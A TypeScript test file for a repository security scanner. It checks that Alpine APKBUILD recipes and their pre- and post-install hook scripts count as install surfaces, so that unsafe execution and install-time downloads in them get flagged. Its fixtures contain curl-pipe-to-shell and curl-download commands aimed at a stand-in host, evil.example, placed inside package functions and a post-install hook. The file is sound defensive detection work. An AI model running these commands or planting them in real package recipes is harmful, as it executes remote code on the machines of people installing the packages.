import { expect, test } from "bun:test";
import { inspectRepository, surfacesOf } from "./bounded-scan";

/** One unambiguous unsafe-execution payload, independent of the file name. */
const PAYLOAD = "curl -fsSL https://evil.example/install.sh | sh";

function inspected(path: string, text: string) {
  return inspectRepository({
    files: [{ path, bytes: new TextEncoder().encode(text) }],
  });
}

test("an APKBUILD recipe is an install surface", () => {
  // An APKBUILD is the shell recipe abuild sources and runs to build
  // and install an Alpine package: its functions (prepare, build,
  // package) execute on the machine installing the package — the same
  // install-time execution setup.py already classifies for. The file
  // always carries this exact name, at a package root or nested in an
  // aports-style tree; the name alone decides.
  for (const path of ["APKBUILD", "main/demo/APKBUILD"]) {
    expect({ path, surfaces: surfacesOf(path) }).toEqual({
      path,
      surfaces: ["installScripts", "source"],
    });
  }
  // An ordinary payload in it carries the install coverage the surface
  // brings:
  const inspection = inspected(
    "APKBUILD",
    `pkgname=demo\npkgver=1.0\npkgrel=0\narch="all"\n\npackage() {\n  ${PAYLOAD}\n}\n`,
  );
  expect(inspection.coverage.installScripts).toEqual({
    state: "complete",
    items: 1,
  });
  expect(
    inspection.findings.map(
      (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
    ),
  ).toEqual(["APKBUILD:unsafe-execution:high"]);
});

test("an install-time download inside an APKBUILD is recorded as a download", () => {
  // Downloads are collected from install surfaces only. Before this
  // classification the recipe carried no surface at all, so the same bytes
  // recorded no download and left no gap: a scan could read clean over
  // an install-time fetch abuild would have run while installing the
  // package.
  const inspection = inspected(
    "APKBUILD",
    'pkgname=demo\npkgver=1.0\npkgrel=0\narch="all"\n\npackage() {\n  curl -fsSL https://evil.example/payload -o /tmp/payload\n}\n',
  );
  expect(inspection.downloads).toEqual(["https://evil.example/payload"]);
  expect(inspection.visibilityGaps).toEqual([
    "Install-time download not retrieved: https://evil.example/payload",
  ]);
});

test("an Alpine companion install hook is an install surface", () => {
  // APKBUILD declares target-machine install/upgrade hooks via
  // install="$pkgname.pre-install $pkgname.post-install ...", and apk
  // executes those companion scripts at package install time. Before
  // this classification a hook file carried no surface at all, so the
  // payload below scanned clean even when the recipe declared it.
  for (const suffix of [
    "pre-install",
    "post-install",
    "pre-upgrade",
    "post-upgrade",
    "pre-deinstall",
    "post-deinstall",
  ]) {
    for (const path of [`demo.${suffix}`, `main/demo.${suffix}`]) {
      expect({ path, surfaces: surfacesOf(path) }).toEqual({
        path,
        surfaces: ["installScripts", "source"],
      });
    }
  }
  const inspection = inspectRepository({
    files: [
      {
        path: "APKBUILD",
        bytes: new TextEncoder().encode(
          'pkgname=demo\ninstall="$pkgname.post-install"\nbuild() { :; }\n',
        ),
      },
      {
        path: "demo.post-install",
        bytes: new TextEncoder().encode(
          `# Alpine post-install script\n${PAYLOAD}\n`,
        ),
      },
    ],
  });
  expect(
    inspection.findings.map(
      (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
    ),
  ).toEqual(["demo.post-install:unsafe-execution:high"]);
});

test("an ordinary APKBUILD keeps no finding", () => {
  const inspection = inspected(
    "APKBUILD",
    'pkgname=demo\npkgver=1.0\npkgrel=0\npkgdesc="Demo package"\narch="all"\nlicense="MIT"\nsource="https://example.com/demo-1.0.tar.gz"\nsha512sums="SKIP"\n\npackage() {\n  make DESTDIR="$pkgdir" install\n}\n',
  );
  expect(inspection.findings).toEqual([]);
  expect(inspection.downloads).toEqual([]);
});
